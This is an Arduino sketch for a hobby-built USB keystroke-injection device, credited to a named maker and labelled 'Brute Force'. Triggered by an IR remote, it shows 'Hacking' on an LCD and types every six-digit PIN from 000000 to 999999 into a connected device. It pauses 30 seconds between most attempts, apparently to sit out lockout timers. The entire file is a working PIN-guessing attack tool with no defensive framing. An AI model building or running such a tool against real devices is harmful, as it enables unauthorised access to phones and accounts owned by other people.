#include <LiquidCrystal.h>
#include <IRremote.h>
#include <Keyboard.h>

#define KEY_KP_ENTER 0xE0

//lcd
  LiquidCrystal lcd(2,3,4,5,6,7);

//ir
  IRrecv ir(12);
  decode_results results;

char ENTER = KEY_KP_ENTER;

void setup() {

//keyboard and mouse
  Keyboard.begin();

//ir
  ir.enableIRIn();

//leds
  //red led on stop
    pinMode(8,OUTPUT);
  //yellow led on start
    pinMode(9,OUTPUT);
    digitalWrite(9,HIGH);
  //green led on play
    pinMode(10,OUTPUT);

//buzzer
  pinMode(11,OUTPUT);
  
//lcd
  lcd.begin(16,2);
  Serial.begin(9600);


//about device
  lcd.setCursor(0,0);
  lcd.print("Brute");
  lcd.setCursor(0,1);
  lcd.print("Force");
  delay(1000);
  lcd.clear();
  lcd.setCursor(0,0);
  lcd.print("Producted by");
  lcd.setCursor(0,1);
  lcd.print("NIT");
  delay(2000);
  lcd.clear();
  lcd.setCursor(0,0);
  lcd.print("Made by");
  delay(1000);
  lcd.clear();
  lcd.setCursor(0,0);
  lcd.print("Salim Marwan");
  delay(1000);
  lcd.clear();
  
}

void loop() {
  
   lcd.setCursor(0,0);
   lcd.print("1 - Start");
   lcd.setCursor(0,1);
   lcd.print("0 - Stop");
   delay(5);
   
   if(ir.decode(&results)){
    
      lcd.clear();

      int value = results.value;
      long vfrom = 000000;
      long vto = 999999;
      switch(value){

         case 0xFF30CF:
         
         //on start hach
             digitalWrite(10,HIGH);
             lcd.setCursor(0,0);
             lcd.print("Hacking");
             delay(200);
             for(long i=vfrom;i<=vto;i++){

                     Keyboard.press(ENTER);
                     Keyboard.release(ENTER);
                     if(i<5){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<6){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<7){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0); 
                     Keyboard.print(i);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<10){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<100){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<1000){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<10000){
                     Keyboard.print(0);
                     Keyboard.print(0);
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<100000){
                     Keyboard.print(0);
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     }else if(i<=999999){
                     Keyboard.print(i);
                     delay(200);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(30000);
                     Keyboard.press(ENTER);
                     delay(200);
                     Keyboard.release(ENTER);
                     delay(200);
                     break; 
                     
                   }
             
             }
           
         //on stop hack

            lcd.clear();
            Keyboard.releaseAll();
            Keyboard.end();
            digitalWrite(8,HIGH);
            lcd.setCursor(0,0);
            lcd.print("Done");
   
            for(int a=1;a<5;a++) //loop five times
            {
                for(int i=200;i<=800;i++) //frequency from 200 to 800
                {
                    tone(11,i);
                    delay(5);
                }
                 
                delay(5);
                
                for(int i=800;i>=200;i--) //frequency from 800 to 200
                {
                    tone(11,i);
                    delay(5);
                }
             }

             noTone(11);
             digitalWrite(8,LOW);
             break;

      }
      
      switch(value){

         case 0xFFC23D:
         
             lcd.display();
             break;

      }
      
      switch(value){

          case 0xFF6897:
         
             lcd.noDisplay();    
             break;

      }
     ir.resume();
   }
}
